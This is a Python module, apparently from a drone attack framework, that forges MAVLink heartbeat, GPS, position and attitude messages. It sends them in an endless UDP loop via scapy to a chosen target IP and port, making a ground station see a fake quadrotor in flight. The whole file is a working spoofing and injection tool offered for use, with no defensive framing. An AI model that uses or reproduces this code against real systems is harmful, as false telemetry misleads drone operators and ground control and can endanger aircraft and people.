from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time
import socket

def is_valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

class NavigationSignalForgeryModule(BaseModule):
    def __init__(self):
        super().__init__(name="Navigation Signal Forgery", description="Forges navigation signals to simulate in-flight drone position and attitude.", category="Injection")
        self.options = {
            "target": {"value": "", "required": True, "description": "The target IP address"},
            "port": {"value": "14550", "required": True, "description": "The target port"}
        }

    def create_heartbeat(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        
        return heartbeat.pack(mav)

    def create_gps_raw_int(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        gps_raw_int = mav.gps_raw_int_encode(
            time_usec=int(time.time() * 1e6),
            fix_type=3,  # 3D fix
            lat=473566100,  # Latitude (in degrees * 1e7)
            lon=854619300,  # Longitude (in degrees * 1e7)
            alt=1500,  # Altitude (in meters * 1000)
            eph=100,  # GPS HDOP horizontal dilution of position
            epv=100,  # GPS VDOP vertical dilution of position
            vel=500,  # GPS ground speed (m/s * 100)
            cog=0,  # Course over ground (degrees * 100)
            satellites_visible=10  # Number of satellites visible
        )

        return gps_raw_int.pack(mav)

    def create_global_position_int(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        global_position_int = mav.global_position_int_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds
            lat=473566100,  # Latitude (in degrees * 1e7)
            lon=854619300,  # Longitude (in degrees * 1e7)
            alt=1500 * 1000,  # Altitude (in millimeters)
            relative_alt=1500 * 1000,  # Altitude relative to ground (in millimeters)
            vx=0,  # GPS ground speed in cm/s
            vy=0,  # GPS ground speed in cm/s
            vz=0,  # GPS ground speed in cm/s
            hdg=0  # Heading (in degrees * 100)
        )

        return global_position_int.pack(mav)

    def create_attitude(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        attitude = mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds
            roll=0.1,  # Roll angle (rad)
            pitch=0.1,  # Pitch angle (rad)
            yaw=1.0,  # Yaw angle (rad)
            rollspeed=0.01,  # Roll angular speed (rad/s)
            pitchspeed=0.01,  # Pitch angular speed (rad/s)
            yawspeed=0.1  # Yaw angular speed (rad/s)
        )

        return attitude.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        if not is_valid_ip(target_ip):
            print(f"Error: Invalid IP address {target_ip}")
            return
        
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        try:
            send(packet)
        except OSError as e:
            print(f"Error sending packet: {e}")

    def run(self):
        target_ip = self.options["target"]["value"].strip()
        target_port = self.options["port"]["value"].strip()

        try:
            target_port = int(target_port)
        except ValueError:
            print("Invalid port value.")
            return

        if not is_valid_ip(target_ip):
            print(f"Invalid target IP: {target_ip}")
            return

        if target_port <= 0:
            print("Invalid target port.")
            return

        while True:
            heartbeat_packet = self.create_heartbeat()
            gps_packet = self.create_gps_raw_int()
            global_position_packet = self.create_global_position_int()
            attitude_packet = self.create_attitude()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(gps_packet, target_ip, target_port)
            self.send_mavlink_packet(global_position_packet, target_ip, target_port)
            self.send_mavlink_packet(attitude_packet, target_ip, target_port)
            
            print(f"Sent heartbeat, GPS, global position, and attitude packets to {target_ip}:{target_port}")
            time.sleep(1)  # Add delay to avoid overwhelming the network
